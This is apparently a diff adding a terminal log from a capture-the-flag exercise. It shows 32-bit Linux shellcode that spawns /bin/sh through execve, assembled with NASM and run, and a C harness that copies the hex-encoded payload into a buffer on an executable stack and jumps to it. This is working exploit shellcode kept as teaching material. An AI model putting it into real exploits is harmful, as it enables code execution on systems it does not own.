@@ -1,0 +1,78 @@
+task05@da993ba8a49a:~$ vim shellcode.asm
+
+task05@da993ba8a49a:~$ nasm -f elf32 shellcode.asm -o shellcode.o
+
+task05@da993ba8a49a:~$ ld -m elf_i386 -o shellcode shellcode.o
+
+task05@da993ba8a49a:~$ ./shellcode
+
+$ ls
+assember.py  assembler.py  babyshell  babyshell_copy  flag.txt  shellcode  shellcode.asm  shellcode.o  solver5.py
+$ cat shellcode.asm
+section .text
+    global _start
+
+_start:
+    xor eax, eax        ; Clear the EAX register
+    push eax            ; Push NULL (end of string) onto the stack
+
+    ; Push the string '/bin//sh' onto the stack
+    push 0x68732f6e     ; 'n/sh'
+    push 0x69622f2f     ; '//bi'
+
+    mov ebx, esp        ; Move the stack pointer to EBX (pointer to the string)
+    xor edx, edx        ; Clear the EDX register
+    push edx            ; Push NULL (end of argument array) onto the stack
+    push ebx            ; Push the pointer to '/bin//sh' (argument array)
+    mov ecx, esp        ; Move the stack pointer to ECX (pointer to the argument array)
+
+    mov al, 0xb         ; Load the syscall number for execve (11) into AL
+    int 0x80            ; Trigger interrupt 0x80 to invoke the syscall
+
+$
+    xor eax, eax        
+    push eax            
+    push 0x68732f6e     
+    push 0x69622f2f     
+    mov ebx, esp        
+    xor edx, edx        
+    push edx            
+    push ebx            
+    mov ecx, esp        
+    mov al, 0xb         
+    int 0x80      
+
+
+task05@da993ba8a49a:~$ gcc -fno-stack-protector -m32 -z execstack -o shell_opener shell_opener.c
+task05@da993ba8a49a:~$ ./shell_opener
+$ ls
+assember.py  assembler.py  babyshell  babyshell_copy  code.bin  flag.txt  help.py  shell  shell-testing  shell_opener  shell_opener.c  shellcode  shellcode.asm  shellcode.o  solver5.py
+$ cat shell_opener.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+const char code[] =
+  "\x31\xc0"             /* xorl    %eax,%eax              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x68""//sh"           /* pushl   $0x68732f2f            */
+  "\x68""/bin"           /* pushl   $0x6e69622f            */
+  "\x89\xe3"             /* movl    %esp,%ebx              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x53"                 /* pushl   %ebx                   */
+  "\x89\xe1"             /* movl    %esp,%ecx              */
+  "\x99"                 /* cdql                           */
+  "\xb0\x0b"             /* movb    $0x0b,%al              */
+  "\xcd\x80"             /* int     $0x80                  */
+;
+
+int main(int argc, char **argv)
+{
+   char buf[sizeof(code)];
+   strcpy(buf, code);
+   ((void(*)( ))buf)( );
+}         
+      
+
+
+
